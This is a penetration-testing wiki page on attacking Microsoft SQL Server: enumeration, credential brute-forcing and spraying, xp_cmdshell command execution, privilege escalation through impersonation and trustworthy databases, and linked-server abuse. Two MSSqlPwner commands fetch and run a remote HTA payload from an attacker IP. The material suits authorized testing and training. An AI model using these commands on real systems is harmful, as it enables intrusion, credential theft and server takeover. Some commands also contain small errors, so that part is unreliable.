---
description: Pentesting MSSQL - TCP Port 1433
---

# MSSQL

## Theory

**Microsoft SQL Server** **(MSSQL)** is a relational database management system developed by Microsoft. By default, it runs on port TCP 1433

**Default MS-SQL System Tables:**

* **master Database**: Records all the system-level information for an instance of SQL Server.
* **msdb Database**: Is used by SQL Server Agent for scheduling alerts and jobs.
* **model Database**: Is used as the template for all databases created on the instance of SQL Server. Modifications made to the model database, such as database size, collation, recovery model, and other database options, are applied to any databases created afterwards.
* **Resource Databas**: Is a read-only database that contains system objects that are included with SQL Server. System objects are physically persisted in the Resource database, but they logically appear in the sys schema of every database.
* **tempdb Database** : Is a work-space for holding temporary objects or intermediate result sets.

## Practice

### Enumerate

{% tabs %}
{% tab title="Nmap" %}
Using nmap scripts, we can enumerate the version of the TNS-Listener

```bash
# Usefull Scipts
nmap --script ms-sql-info -p 1433 <target-ip>
nmap --script ms-sql-config -p 1433 <target-ip>
nmap --script ms-sql-empty-password,ms-sql-xp-cmdshell -p 1433 <target-ip>
nmap --script ms-sql-* -p 1433 <target-ip>

# Run all Scripts
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```
{% endtab %}

{% tab title="SPNs" %}
In Active Directory environements, we can directly request the Domain Controller for a list of SPNs, to stealthly identify MSSQL servers.

From a Windows Domain-Joined Computer, we can use the [setspn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\)) or [GetUserSPNs.ps1](https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1) command as follows.

```bash
# Setspn LOLBIN
setspn -T domain.local -Q MSSQLSvc/*

# Using GetUserSPNs
. .\GetUserSPNs.ps1
```

From an UNIX-Like hosts, we can directly search using [GetUserSPNs ](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)from impacket:

```bash
GetUserSPNs.py -dc-ip <DC_IP> '<DOMAIN>/<USER>:<Password>'
```
{% endtab %}
{% endtabs %}

### Enumerate DB Objects

To enumerate Databases, Tables, Columns, Users, Permissions, refers to the following page

{% content-ref url="../../web/infrastructures/dbms/enum-databases.md" %}
[enum-databases.md](../../web/infrastructures/dbms/enum-databases.md)
{% endcontent-ref %}

### Brute Force Credentials

{% hint style="danger" %}
If you **don't** **have credentials** you can try to guess them. You can use nmap or metasploit. Be careful, you can **block accounts** if you fail login several times using an existing username.
{% endhint %}

{% tabs %}
{% tab title="NetExec" %}
Using [NetExec](https://github.com/Pennyw0rth/NetExec), we may bruteforce MSSQL credentials.

```bash
# Bruteforce
nxc mssql <TARGET> -u <userfile> -p <passwordfile> --no-bruteforce

# Password-Spray
nxc mssql <TARGET> -u <userfile> -p <passwordfile> --no-bruteforce
```
{% endtab %}

{% tab title="Hydra" %}
Using Hydra, we may bruteforce MSSQL credentials.

```bash
hydra -L usernames.txt –p password <target-ip> mssql
hydra -l username –P passwords.txt <target-ip> mssql
```
{% endtab %}
{% endtabs %}

### Sign-in

{% tabs %}
{% tab title="mssqlclient" %}
Using [mssqlclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) from [Impacket](https://github.com/fortra/impacket), we can login to an MSSQL instance.

```bash
#Classic login
mssqlclient.py -port 1433 DOMAIN/username:password@<target-ip>

#Use Windows Authentication (forces NTLM authentication)
mssqlclient.py -port 1433 DOMAIN/username:password@<target-ip> -windows-auth

#Use Kerberos
mssqlclient.py -k DC1.DOMAIN.LOCAL 
```
{% endtab %}

{% tab title="sqsh" %}
Using [sqsh](https://manpages.debian.org/testing/sqsh/sqsh.1) we can connect to a MSSQL instance.

```bash
sqsh -S <target-ip> -U username -P password
sqsh -S <target-ip> -U username -P password -D database
```
{% endtab %}

{% tab title="NetExec" %}
Tools like [NetExec](https://github.com/Pennyw0rth/NetExec) can be used to login to an MSSQL instance, and to perform SQL queries.

```bash
# Domain Auth
netexec mssql <TARGET> -u <USER> -p <PASSWORD> -q 'SELECT name FROM master.dbo.sysdatabases;'

# Use Windows Authentication (forces NTLM authentication)
netexec mssql <TARGET> -u <USER> -p <PASSWORD> --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```
{% endtab %}
{% endtabs %}

### Remote Code Execution

{% tabs %}
{% tab title="NetExec" %}
Tools like [NetExec](https://github.com/Pennyw0rth/NetExec) can be used to execute OS commands from MSSQL

```bash
# Execute commands using xp_cmdshell
netexec mssql <TARGET> -d <DOMAIN> -u <USER> -p <PASSWORD> -x "whoami"
```
{% endtab %}

{% tab title="MSSqlPwner" %}
[MSSqlPwner](https://github.com/ScorpionesLabs/MSSqlPwner) can be used to execute remote commands through various methods.

```bash
# Interactive mode
mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth interactive

# Interactive mode with 2 depth level of impersonations
mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth -max-impersonation-depth 2 interactive

# Executing custom assembly on the current server with windows authentication and executing whoami command 
mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth custom-asm whoami

# Executing the whoami command using stored procedures with sp_oacreate method
mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate

# Execute code using custom assembly
mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth inject-custom-asm SqlInject.dll 
```
{% endtab %}

{% tab title="mssclient" %}
Using [mssqlclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) from [Impacket](https://github.com/fortra/impacket), we may be able to execute code.

```sql
$ mssqlclient.py -port 1433 <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
# Enable xp_cmdshell
SQL (dbo@master)> enable_xp_cmdshell
# Execute command
SQL (dbo@master)> xp_cmdshell whoami
```
{% endtab %}
{% endtabs %}

### Local Code Execution

To localy execute/read/write files on an MSSQL instance, see the following page:

{% content-ref url="../../web/infrastructures/dbms/exploit-databases.md" %}
[exploit-databases.md](../../web/infrastructures/dbms/exploit-databases.md)
{% endcontent-ref %}

### Coerced Auths (Stealing NTLM Hash)

On MS-SQL (Microsoft SQL) servers, the EXEC method can be used to access a remote SMB share. MSSQL uses **Keberos** to authenticate users so we can retrieve the NTLM hash.

{% content-ref url="../../ad/movement/mitm-and-coerced-authentications/living-off-the-land.md" %}
[living-off-the-land.md](../../ad/movement/mitm-and-coerced-authentications/living-off-the-land.md)
{% endcontent-ref %}

### MSSQL Privilege Escalation

{% tabs %}
{% tab title="Impersonate" %}
SQL Server has a special permission, named **`IMPERSONATE`**, that **allows the executing user to take on the permissions of another user** or login until the context is reset or the session ends.

### UNIX-Like

From an UNIX-Like host, using [NetExec](https://github.com/Pennyw0rth/NetExec), we can enumerate for impersonation privileges and PrivEsc as follows

```bash
# Enumerate PrivEsc vectors
nxc mssql <TARGET> <TARGET> -u <USER> -p <PASSWORD> -M mssql_priv

# Impersonate PrivEsc
nxc mssql <TARGET> <TARGET> -u <USER> -p <PASSWORD> -M mssql_priv -o ACTION=privesc

# Rollback sysadmin privs
nxc mssql <TARGET> <TARGET> -u <USER> -p <PASSWORD> -M mssql_priv -o ACTION=rollback
```

### Windows

To enumerate users that you can impersonate, run the following queries

```sql
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned
```

We may also use [mssqlclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) from [Impacket](https://github.com/fortra/impacket) to enumerate users that we can impersonate

```bash
SQL (dbo@ScrambleHR)> enum_impersonate
```

If you can impersonate a user, even if he isn't sysadmin, you should check i**f the user has access** to other **databases** or linked servers.

```sql
# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

Note that once you are sysadmin you can impersonate any other one:

```sql
-- Impersonate RegUser
EXECUTE AS LOGIN = 'RegUser'
-- Verify you are now running as the the MyUser4 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Change back to sa
REVERT
```
{% endtab %}

{% tab title="db_owner to sysadmin" %}
If a **regular user** is given the role **`db_owner`** over the **database owned by an admin** user (such as **`sa`**) and that database is configured as **`trustworthy`**, that user can abuse these privileges to **privesc** because **stored procedures** created in there that can **execute** as the owner (**admin**).

### Windows

To enumerate, run the following queries

```sql
# Get owners of databases
SELECT suser_sname(owner_sid) FROM sys.databases

# Find trustworthy databases
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;

# Get roles over the selected database (look for your username as db_owner)
USE <trustworthy_db>
SELECT rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
```

If you found you are db\_owner of a trustworthy database, you can privesc

```sql
--1. Create a stored procedure to add your user to sysadmin role
USE <trustworthy_db>

CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'USERNAME','sysadmin'

--2. Execute stored procedure to get sysadmin role
USE <trustworthy_db>
EXEC sp_elevate_me

--3. Verify your user is a sysadmin
SELECT is_srvrolemember('sysadmin')
```

Otherwise, we can use [Invoke-SqlServerDbElevateDbOwner](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1) powershell script to automate the exploit

```powershell
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
```
{% endtab %}
{% endtabs %}

### Local Privilege Escalation

The user running MSSQL server will have enabled the privilege token **SeImpersonatePrivilege.**\
You probably will be able to **escalate to Administrator or NT AUTHORITY\SYSTEM** following this page:

{% content-ref url="../../redteam/privilege-escalation/windows/abusing-tokens.md" %}
[abusing-tokens.md](../../redteam/privilege-escalation/windows/abusing-tokens.md)
{% endcontent-ref %}

### Linked SQL Servers Abuse

[Linked servers](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine?view=sql-server-ver16) are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

{% tabs %}
{% tab title="Ennumerate" %}
From an UNIX-Like machine, we can enumerate Linked SQL Servers using [MssqlClient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) or [MSSqlPwner](https://github.com/ScorpionesLabs/MSSqlPwner).

```bash
# mssqlclient.py
mssqlclient.py -port 1433 <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
SQL (dbo@master)> enum_links

# MSSqlPwner
mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth get-link-server-list
```

{% hint style="info" %}
We can also enumerate Linked Servers using the followins SQL query on a MSSQL instance:

```sql
EXEC sp_linkedservers;
```
{% endhint %}
{% endtab %}

{% tab title="Exploit" %}
### Remote Execution

From an UNIX-Like machine, we can execute code on a Linked SQL Servers using [MssqlClient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) or [MSSqlPwner](https://github.com/ScorpionesLabs/MSSqlPwner).&#x20;

{% hint style="danger" %}
The SQL login on the Linked SQL Server must be `sysadmin`
{% endhint %}

```bash
# mssqlclient.py
mssqlclient.py -port 1433 <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
SQL (dbo@master)> use_link <LINKED_SRV_NAME>
SQL >APPSRV01 (sa  dbo@master)> enable_xp_cmdshell
SQL >APPSRV01 (sa  dbo@master)> xp_cmdshell whoami

# MSSqlPwner
## Execution using using stored procedures
mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth exec whoami -link-name <LINKED_SRV_NAME>
## Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth -link-name <LINKED_SRV_NAME> exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://exploit-notes.hdks.org/exploit/database/mssql-pentesting/" %}

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-serve" %}
